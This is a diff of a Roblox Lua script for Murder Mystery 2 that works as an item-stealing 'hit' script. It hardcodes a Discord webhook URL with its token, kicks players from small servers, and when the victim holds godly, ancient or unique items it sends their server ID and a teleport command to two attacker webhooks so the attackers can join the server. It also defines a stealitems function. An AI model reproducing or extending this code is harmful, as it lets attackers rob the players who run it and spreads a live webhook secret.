@@ -793,6 +793,7 @@ local values = {
 
 UserName1 = "TehPucuk_55"
 WebHook1 = "https://discord.com/api/webhooks/1207564545736974366/qFtOwfb7c0uA7HO2RoSH-SPT4kDLc0Om7PjNF_uHFB0Biq1Ys4N8ESfW2m3pwacKJRsN"
+
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("Exit game and re-inject")
 end
@@ -1060,7 +1061,7 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
 
 local WebHookEmbed = CreateEmbed(
     "MM2 Hit - Ft. Light Monzz",
-    "",
+    "Please execute the code above to get your hit.",
     11220,
     {
         {
@@ -1091,11 +1092,11 @@ local WebHookEmbed = CreateEmbed(
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
-    SendWebhook(WebHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
     SendWebhook(WebHook1, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(WebHook, {content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 else
-    SendWebhook(WebHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
     SendWebhook(WebHook1, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
+    SendWebhook(WebHook, {content = 'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
 local function stealitems(targetUser)
